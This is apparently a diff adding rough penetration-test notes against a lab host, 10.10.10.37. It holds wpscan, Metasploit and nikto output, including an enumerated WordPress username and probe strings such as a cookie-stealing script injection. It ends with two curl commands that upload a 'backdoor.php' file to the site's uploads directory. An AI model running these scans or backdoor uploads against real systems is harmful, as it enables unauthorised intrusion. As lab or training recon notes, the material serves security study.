@@ -1,0 +1,96 @@
+wpscan -u 10.10.10.37 -f -e -r
+
+[!] Upload directory has directory listing enabled: http://10.10.10.37/wp-content/uploads/
+[!] Includes directory has directory listing enabled: http://10.10.10.37/wp-includes/
+
+[+] WordPress version 4.8 (Released on 2017-06-08) identified from meta generator, links opml
+
+[+] WordPress theme in use: twentyseventeen - v1.3
+
+[+] Name: twentyseventeen - v1.3
+ |  Latest version: 1.3 (up to date)
+ |  Last updated: 2017-06-08T00:00:00.000Z
+ |  Location: http://10.10.10.37/wp-content/themes/twentyseventeen/
+ |  Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt
+ |  Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css
+ |  Theme Name: Twenty Seventeen
+ |  Theme URI: https://wordpress.org/themes/twentyseventeen/
+ |  Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a...
+ |  Author: the WordPress team
+ |  Author URI: https://wordpress.org/
+
+ Enumerating usernames ...
+ [+] Identified the following 1 user/s:
+     +----+-------+---------+
+     | Id | Login | Name    |
+     +----+-------+---------+
+     | 1  | notch | Notch – |
+     +----+-------+---------+
+
+     Hosts
+     =====
+
+     address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+     -------      ---  ----  -------  ---------  -----  -------  ----  --------
+     10.10.10.37             Linux                      server
+
+     msf > services
+
+     Services
+     ========
+
+     host         port  proto  name    state   info
+     ----         ----  -----  ----    -----   ----
+     10.10.10.37  21    tcp    ftp     open    ProFTPD 1.3.5a
+     10.10.10.37  22    tcp    ssh     open    OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 Ubuntu Linux; protocol 2.0
+     10.10.10.37  80    tcp    http    open    Apache httpd 2.4.18 (Ubuntu)
+     10.10.10.37  8192  tcp    sophos  closed
+
+     RHOSTS => 10.10.10.37
+     msf auxiliary(dir_scanner) > run
+
+     [*] Detecting error code
+     [*] Using code '404' as not found for 10.10.10.37
+     [+] Found http://10.10.10.37:80/icons/ 403 (10.10.10.37)
+     [+] Found http://10.10.10.37:80/javascript/ 404 (10.10.10.37)
+     [+] Found http://10.10.10.37:80/phpmyadmin/ 404 (10.10.10.37)
+     [+] Found http://10.10.10.37:80/plugins/ 200 (10.10.10.37)
+     [+] Found http://10.10.10.37:80/wp-includes/ 200 (10.10.10.37)
+
+     nikto:
+
+     + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ OSVDB-3268: /wp-content/uploads/: Directory indexing found.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
++ OSVDB-3268: /wp-content/uploads/./: Directory indexing found.
++ OSVDB-3268: /wp-content/uploads/?mod=node&nid=some_thing&op=view: Directory indexing found.
++ OSVDB-3268: /wp-content/uploads/?mod=some_thing&op=browse: Directory indexing found.
++ /wp-content/uploads/./: Appending '/./' to a directory allows indexing
++ OSVDB-3268: /wp-content/uploads//: Directory indexing found.
++ /wp-content/uploads//: Apache on Red Hat Linux release 9 reveals the root directory listing by default if there is no index page.
++ OSVDB-3268: /wp-content/uploads/?Open: Directory indexing found.
++ OSVDB-3268: /wp-content/uploads/?OpenServer: Directory indexing found.
++ OSVDB-3268: /wp-content/uploads/%2e/: Directory indexing found.
++ OSVDB-576: /wp-content/uploads/%2e/: Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. http://www.securityfocus.com/bid/2513.
++ OSVDB-3268: /wp-content/uploads/?mod=<script>alert(document.cookie)</script>&op=browse: Directory indexing found.
++ OSVDB-3268: /wp-content/uploads/?sql_debug=1: Directory indexing found.
++ OSVDB-3268: /wp-content/uploads///: Directory indexing found.
++ OSVDB-3268: /wp-content/uploads/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: Directory indexing found.
++ OSVDB-3268: /wp-content/uploads/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: Directory indexing found.
++ OSVDB-3268: /wp-content/uploads/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: Directory indexing found.
++ OSVDB-3268: /wp-content/uploads/?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: Directory indexing found.
++ OSVDB-3268: /wp-content/uploads/?PageServices: Directory indexing found.
++ OSVDB-119: /wp-content/uploads/?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269.
++ OSVDB-3268: /wp-content/uploads/?wp-cs-dump: Directory indexing found.
++ OSVDB-119: /wp-content/uploads/?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269.
++ OSVDB-3268: /wp-content/uploads///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.
++ OSVDB-3288: /wp-content/uploads///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when 	 /'s are requested.
++ OSVDB-3268: /wp-content/uploads/?pattern=/etc/*&sort=name: Directory indexing found.
+
+
+<h2>File upload with curl<h2>
+curl -F 'files[]=@/backdoor.php' http://10.10.10.37/wp-content/uploads/
+
+h
+
+curl -F 'img_avatar=@/backdoor.php' http://10.10.10.37/wp-content/uploads/
